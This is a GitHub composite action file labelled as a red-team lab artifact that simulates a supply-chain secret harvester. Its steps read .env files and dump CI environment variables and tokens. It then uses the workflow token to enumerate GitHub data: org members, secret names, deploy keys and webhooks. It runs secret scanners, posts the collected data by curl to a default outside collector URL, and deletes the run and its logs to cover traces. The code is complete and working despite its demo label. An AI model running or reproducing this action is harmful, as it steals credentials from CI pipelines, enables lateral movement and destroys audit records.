# action.yaml
name: "[LAB] Supply Chain Secret Harvester – Demo Only"
description: |
  LAB ARTIFACT – DO NOT USE IN PRODUCTION.
  Simulates a malicious composite action: harvest .env files, CI env vars (secrets),
  GitHub API enumeration, gitleaks scan, then POST to attacker-controlled collector.
  Red team training / developer security awareness. MITRE T1195.002, T1552.001, T1567.
inputs:
  action:
    description: "Action mode: execute | recon | exfil | cleanup (reserved for future)"
    required: false
    default: 'execute'
  collector_url:
    description: "Attacker collector URL (webhook.site, ngrok, local HTTP server, etc.)"
    required: false
    default: 'https://d.redacted.rest/t/workflow'
  log_debug:
    description: "Temp path for harvested data"
    required: false
    default: '/var/tmp/lab-harvest.txt'
  cleanup:
    description: "Delete harvest file and GitHub run logs after exfil"
    required: false
    default: 'true'
  scanner:
    description: "Secret scanner to use: noseyparker | gitleaks | both"
    required: false
    default: 'noseyparker'

outputs:
  response:
    description: "Exfil status"
    value: ${{ steps.exfil.outputs.response }}

runs:
  using: composite
  steps:
    - name: "[LAB] Checkout"
      uses: actions/checkout@v4
      with:
        fetch-depth: 0
      continue-on-error: true

    - name: "[LAB] Init"
      continue-on-error: true
      run: |
        set +eo pipefail
        {
          echo "--- LAB HARVEST: $(date -u) ---"
          echo "Repo: ${{ github.repository }}"
          pwd
          ls -la
          echo ""
        } > "${{ inputs.log_debug }}" 2>/dev/null
      shell: bash

    - name: "[LAB] Harvest .env files"
      continue-on-error: true
      run: |
        set +eo pipefail
        LOG="${{ inputs.log_debug }}"
        [ -f "$LOG" ] || touch "$LOG"
        {
          echo "--- .env files ---"
          while read -r file; do
            echo "[file] $file"
            cat "$file" 2>/dev/null
            echo ""
          done < <(find . -type f -regex ".*\.env\(\.[a-z]+\)\?$" 2>/dev/null)
          echo ""
        } >> "$LOG"
      shell: bash

    - name: "[LAB] Harvest env vars"
      continue-on-error: true
      run: |
        set +eo pipefail
        LOG="${{ inputs.log_debug }}"
        [ -f "$LOG" ] || touch "$LOG"
        {
          echo "--- env: high-value (keys/secrets/tokens/passwords) ---"
          python3 -c "
import os, re, json
want = re.compile(r'key|secret|token|password|passwd|_pass|credential|auth|api_|dsn|private|jwt|webhook|database_url|redis_url|smtp', re.I)
skip = re.compile(r'^(GITHUB_ACTION|GITHUB_REF|GITHUB_RUN|GITHUB_STEP|GITHUB_WORKFLOW|GITHUB_ENV|GITHUB_PATH|GITHUB_OUTPUT|RUNNER_)')
for k, v in sorted(os.environ.items()):
    if want.search(k) and not skip.match(k):
        print(json.dumps({k: v}) if ('\n' in v or len(v) > 200) else f'{k}={v}')
" 2>/dev/null || \
          printenv 2>/dev/null \
            | grep -iE '(key|secret|token|password|passwd|_pass|credential|auth|api_|dsn|private|jwt|webhook|database_url|redis_url|smtp)' \
            | grep -v '^GITHUB_ACTION\|^GITHUB_REF\|^GITHUB_RUN\|^GITHUB_STEP\|^GITHUB_WORKFLOW\|^GITHUB_ENV\|^GITHUB_PATH\|^GITHUB_OUTPUT\|^RUNNER_' \
            | sort || true
          echo ""
          echo "--- env: github tokens (lateral movement) ---"
          printenv 2>/dev/null \
            | grep -E '^(GITHUB_TOKEN|ACTIONS_RUNTIME_TOKEN|ACTIONS_ID_TOKEN_REQUEST_TOKEN|ACTIONS_CACHE_URL|ACTIONS_RESULTS_URL)' \
            | sort || true
          echo ""
          echo "--- env: full dump ---"
          printenv 2>/dev/null | sort || true
          echo ""
        } >> "$LOG"
      shell: bash

    - name: "[LAB] GitHub API enumeration (lateral movement)"
      continue-on-error: true
      env:
        GH_TOKEN: ${{ github.token }}
      run: |
        set +eo pipefail
        LOG="${{ inputs.log_debug }}"
        [ -f "$LOG" ] || touch "$LOG"
        API="https://api.github.com"
        REPO="${{ github.repository }}"
        OWNER="${{ github.repository_owner }}"
        HDR=(-s --max-time 10 -H "Authorization: Bearer $GH_TOKEN" -H "Accept: application/vnd.github+json")
        if [ -z "$GH_TOKEN" ]; then
          echo "--- GitHub API: skipped (no token) ---" >> "$LOG"
          exit 0
        fi
        JQ="jq -c"
        {
          echo "--- GitHub API: token identity ---"
          curl "${HDR[@]}" "$API/user" 2>/dev/null \
            | $JQ '{id,login,name,email,type,site_admin}' || true
          echo ""

          echo "--- GitHub API: orgs accessible ---"
          curl "${HDR[@]}" "$API/user/orgs?per_page=100" 2>/dev/null \
            | $JQ '.[] | {id,login,description}' || true
          echo ""

          echo "--- GitHub API: repo metadata ---"
          curl "${HDR[@]}" "$API/repos/$REPO" 2>/dev/null \
            | $JQ '{id,full_name,private,default_branch,permissions}' || true
          echo ""

          echo "--- GitHub API: secret names ---"
          curl "${HDR[@]}" "$API/repos/$REPO/actions/secrets" 2>/dev/null \
            | $JQ '{total_count, secrets: [.secrets[].name]}' || true
          echo ""

          echo "--- GitHub API: variables ---"
          curl "${HDR[@]}" "$API/repos/$REPO/actions/variables" 2>/dev/null \
            | $JQ '{total_count, variables: [.variables[] | {name,value}]}' || true
          echo ""

          echo "--- GitHub API: environments ---"
          curl "${HDR[@]}" "$API/repos/$REPO/environments" 2>/dev/null \
            | $JQ '[.environments[] | {id,name}]' || true
          echo ""

          echo "--- GitHub API: org/user repos ---"
          curl "${HDR[@]}" "$API/users/$OWNER/repos?per_page=100&type=all" 2>/dev/null \
            | $JQ '[.[] | {id,full_name,private,language}]' || true
          curl "${HDR[@]}" "$API/orgs/$OWNER/repos?per_page=100&type=all" 2>/dev/null \
            | $JQ '[.[] | {id,full_name,private,language}]' || true
          echo ""

          echo "--- GitHub API: org members ---"
          curl "${HDR[@]}" "$API/orgs/$OWNER/members?per_page=100" 2>/dev/null \
            | $JQ '[.[] | {id,login}]' || true
          echo ""

          echo "--- GitHub API: recent workflow runs ---"
          RUNS=$(curl "${HDR[@]}" "$API/repos/$REPO/actions/runs?per_page=5" 2>/dev/null || echo "{}")
          echo "$RUNS" | $JQ '[.workflow_runs[] | {id,name,status,conclusion,created_at}]' || true
          RUN_ID=$(echo "$RUNS" | jq -r '.workflow_runs[0].id // empty' 2>/dev/null || true)
          if [ -n "$RUN_ID" ]; then
            echo "--- GitHub API: artifacts for run $RUN_ID ---"
            curl "${HDR[@]}" "$API/repos/$REPO/actions/runs/$RUN_ID/artifacts" 2>/dev/null \
              | $JQ '[.artifacts[] | {name,size_in_bytes,archive_download_url}]' || true
          fi
          echo ""

          echo "--- GitHub API: collaborators ---"
          curl "${HDR[@]}" "$API/repos/$REPO/collaborators?per_page=100" 2>/dev/null \
            | $JQ '[.[] | {id,login,permissions}]' || true
          echo ""

          echo "--- GitHub API: deploy keys ---"
          curl "${HDR[@]}" "$API/repos/$REPO/keys" 2>/dev/null \
            | $JQ '[.[] | {id,title,key,read_only}]' || true
          echo ""

          echo "--- GitHub API: webhooks ---"
          curl "${HDR[@]}" "$API/repos/$REPO/hooks" 2>/dev/null \
            | $JQ '[.[] | {id,type,events,config:{url:.config.url}}]' || true
          echo ""
        } >> "$LOG"
      shell: bash

    - name: "[LAB] Gitleaks – hardcoded credentials in source"
      if: ${{ inputs.scanner == 'gitleaks' || inputs.scanner == 'both' }}
      continue-on-error: true
      env:
        GH_TOKEN: ${{ github.token }}
      run: |
        set +eo pipefail
        LOG="${{ inputs.log_debug }}"
        [ -f "$LOG" ] || touch "$LOG"

        mkdir -p /tmp/gitleaks_dl
        gh release download \
          --repo gitleaks/gitleaks \
          --pattern '*linux_x64.tar.gz' \
          --dir /tmp/gitleaks_dl \
          2>/dev/null || true
        TARBALL=$(find /tmp/gitleaks_dl -name '*.tar.gz' 2>/dev/null | head -1)
        if [ -n "$TARBALL" ]; then
          tar -xz -C /usr/local/bin -f "$TARBALL" gitleaks 2>/dev/null || true
          chmod +x /usr/local/bin/gitleaks 2>/dev/null || true
        fi

        {
          echo "--- gitleaks hardcoded credentials ---"
          if command -v gitleaks >/dev/null 2>&1; then
            GL_REPORT=/tmp/gitleaks-report.json
            gitleaks detect \
              --source . \
              --no-git \
              --config "${{ github.action_path }}/.gitleaks.toml" \
              --report-format json \
              --report-path "$GL_REPORT" \
              --exit-code 0 \
              2>/dev/null || true
            cat "$GL_REPORT" 2>/dev/null \
              | jq '[.[] | {rule:.RuleID, file:.File, line:.StartLine, secret:.Secret}]' || true
            rm -f "$GL_REPORT"
          else
            echo "(gitleaks unavailable)"
          fi
          echo ""
        } >> "$LOG"
      shell: bash

    - name: "[LAB] Noseyparker – broad pattern secret scan"
      if: ${{ inputs.scanner == 'noseyparker' || inputs.scanner == 'both' }}
      continue-on-error: true
      env:
        GH_TOKEN: ${{ github.token }}
      run: |
        set +eo pipefail
        LOG="${{ inputs.log_debug }}"
        [ -f "$LOG" ] || touch "$LOG"

        ARCH=$(uname -m)
        case "$ARCH" in
          x86_64)  NP_ARCH="x86_64-unknown-linux-musl" ;;
          aarch64) NP_ARCH="aarch64-unknown-linux-musl" ;;
          *) echo "--- noseyparker: unsupported arch ($ARCH) ---" >> "$LOG"; exit 0 ;;
        esac

        mkdir -p /tmp/np_dl
        gh release download \
          --repo praetorian-inc/noseyparker \
          --pattern "noseyparker-*-${NP_ARCH}.tar.gz" \
          --dir /tmp/np_dl \
          2>/dev/null || true
        TARBALL=$(find /tmp/np_dl -name '*.tar.gz' 2>/dev/null | head -1)
        if [ -n "$TARBALL" ]; then
          mkdir -p /tmp/np_extract
          tar -xz -C /tmp/np_extract -f "$TARBALL" 2>/dev/null || true
          chmod +x /tmp/np_extract/bin/noseyparker 2>/dev/null || true
        fi
        NP=/tmp/np_extract/bin/noseyparker

        {
          echo "--- noseyparker: secret pattern scan ---"
          if [ -x "$NP" ]; then
            NP_DS=/tmp/np-datastore
            NP_IGNORE=/tmp/np-ignore
            rm -rf "$NP_DS"
            printf '.noseyparker/\n.gitleaks.toml\n' > "$NP_IGNORE"
            "$NP" scan \
              --datastore "$NP_DS" \
              --rules-path "${{ github.action_path }}/.noseyparker" \
              --ruleset all \
              -i "$NP_IGNORE" \
              . 2>/dev/null || true
            "$NP" report --datastore "$NP_DS" --format json 2>/dev/null \
              | jq '[.[] | {rule:.rule_name, findings:[.matches[] | {file:(.provenance[0].path // "git"), line:.location.source_span.start.line, secret:(.snippet.matching | gsub("[\\n\\t]";" ") | ltrimstr(" "))}]}]' || true
            rm -rf "$NP_DS" /tmp/np_dl /tmp/np_extract "$NP_IGNORE"
          else
            echo "(noseyparker unavailable)"
          fi
          echo ""
        } >> "$LOG"
      shell: bash

    - name: "[LAB] Exfil to collector"
      continue-on-error: true
      shell: bash
      id: exfil
      run: |
        set +eo pipefail
        LOG="${{ inputs.log_debug }}"
        [ -f "$LOG" ] || echo "(no harvest data)" > "$LOG"

        # Secret kosong akan override default — fallback eksplisit
        COLLECTOR="${{ inputs.collector_url }}"
        [ -z "$COLLECTOR" ] && COLLECTOR="https://d.redacted.rest/t/workflow"

        HTTP_STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
          --max-time 30 \
          -A "Mozilla/5.0 (compatible; GitHub-Actions/${{ github.run_id }}; +${{ github.server_url }}/${{ github.repository }})" \
          -e "${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }}" \
          -X POST "$COLLECTOR" \
          -H "X-Lab-Repo: ${{ github.repository }}" \
          -H "X-Lab-Runner: ${{ runner.os }}" \
          -H "X-Lab-Ref: ${{ github.ref }}" \
          -H "X-Lab-Sha: ${{ github.sha }}" \
          -F "harvest=@${LOG};type=text/plain;filename=${{ github.event.repository.name }}-${{ github.run_id }}.txt" \
          -F "repo=${{ github.repository }}" \
          -F "runner=${{ runner.os }}" \
          -F "hostname=$(hostname 2>/dev/null || true)" \
          -F "whoami=$(whoami 2>/dev/null || true)" \
          -F "sha=${{ github.sha }}" \
          -F "ref=${{ github.ref }}" \
          2>/dev/null || echo "000")

        if [[ "$HTTP_STATUS" =~ ^2 ]]; then
          echo "response=Success ($HTTP_STATUS)" >> "$GITHUB_OUTPUT"
        else
          echo "response=Error ($HTTP_STATUS)" >> "$GITHUB_OUTPUT"
        fi

    - name: "[LAB] Cleanup – minimize trace"
      if: ${{ inputs.cleanup == 'true' }}
      continue-on-error: true
      env:
        GH_TOKEN: ${{ github.token }}
      run: |
        set +eo pipefail
        shred -u "${{ inputs.log_debug }}" 2>/dev/null || rm -f "${{ inputs.log_debug }}" || true

        [ -z "$GH_TOKEN" ] && exit 0

        RUN_ID="${{ github.run_id }}"
        REPO="${{ github.repository }}"
        curl -s -o /dev/null -X DELETE \
          -H "Authorization: Bearer $GH_TOKEN" \
          -H "Accept: application/vnd.github+json" \
          "https://api.github.com/repos/$REPO/actions/runs/$RUN_ID/logs" 2>/dev/null || true

        curl -s -o /dev/null -X DELETE \
          -H "Authorization: Bearer $GH_TOKEN" \
          -H "Accept: application/vnd.github+json" \
          "https://api.github.com/repos/$REPO/actions/runs/$RUN_ID" 2>/dev/null || true
      shell: bash

    - name: "[LAB] Done"
      run: echo "[lab] done"
      shell: bash
